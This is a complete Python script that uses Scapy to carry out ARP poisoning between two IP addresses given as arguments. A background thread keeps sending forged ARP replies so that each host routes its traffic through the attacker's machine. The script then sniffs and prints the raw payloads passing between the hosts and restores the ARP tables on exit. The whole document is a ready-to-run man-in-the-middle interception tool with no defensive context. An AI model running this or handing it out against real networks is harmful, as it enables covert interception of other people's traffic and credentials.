from scapy.all import *
import sys
import time
import threading


def get_mac(ip):
    arp_req = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    pkt = broadcast / arp_req
    answered, _ = srp(pkt, timeout=2, verbose=False)
    for _, rcv in answered:
        return rcv[Ether].src
    raise Exception(f"Could not resolve MAC for {ip}")


def spoof(target_ip, spoof_ip, target_mac):
    # tell target_ip that spoof_ip is at our MAC
    pkt = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip
    )
    sendp(pkt, verbose=False)


def restore(target_ip, target_mac, source_ip, source_mac):
    pkt = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac
    )
    sendp(pkt, count=4, verbose=False)


def packet_callback(ip1, ip2, pkt):
    if not pkt.haslayer(IP):
        return
    src = pkt[IP].src
    dst = pkt[IP].dst
    if not ({src, dst} == {ip1, ip2}):
        return
    # get payload of the last/innermost layer
    last = pkt
    while last.payload and last.payload.__class__.__name__ != "NoPayload":
        last = last.payload
    raw = bytes(last)
    print(f"Received traffic from {src} to {dst}: {raw}")


def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <ip1> <ip2>")
        sys.exit(1)

    ip1, ip2 = sys.argv[1], sys.argv[2]

    print(f"[*] Resolving MACs...")
    mac1 = get_mac(ip1)
    mac2 = get_mac(ip2)
    print(f"[*] {ip1} -> {mac1}")
    print(f"[*] {ip2} -> {mac2}")

    stop_event = threading.Event()

    def spoof_loop():
        while not stop_event.is_set():
            spoof(ip1, ip2, mac1)  # tell ip1 that ip2 is at attacker
            spoof(ip2, ip1, mac2)  # tell ip2 that ip1 is at attacker
            time.sleep(1)

    spoof_thread = threading.Thread(target=spoof_loop, daemon=True)
    spoof_thread.start()

    print("[*] ARP poisoning active. Sniffing packets... Press Ctrl+C to stop.")

    try:
        sniff(
            filter=f"ip host {ip1} and ip host {ip2}",
            prn=lambda pkt: packet_callback(ip1, ip2, pkt),
            store=False,
        )
    except KeyboardInterrupt:
        pass
    finally:
        print("\n[*] Restoring ARP tables...")
        stop_event.set()
        restore(ip1, mac1, ip2, mac2)
        restore(ip2, mac2, ip1, mac1)
        print("[*] Done.")


if __name__ == "__main__":
    main()
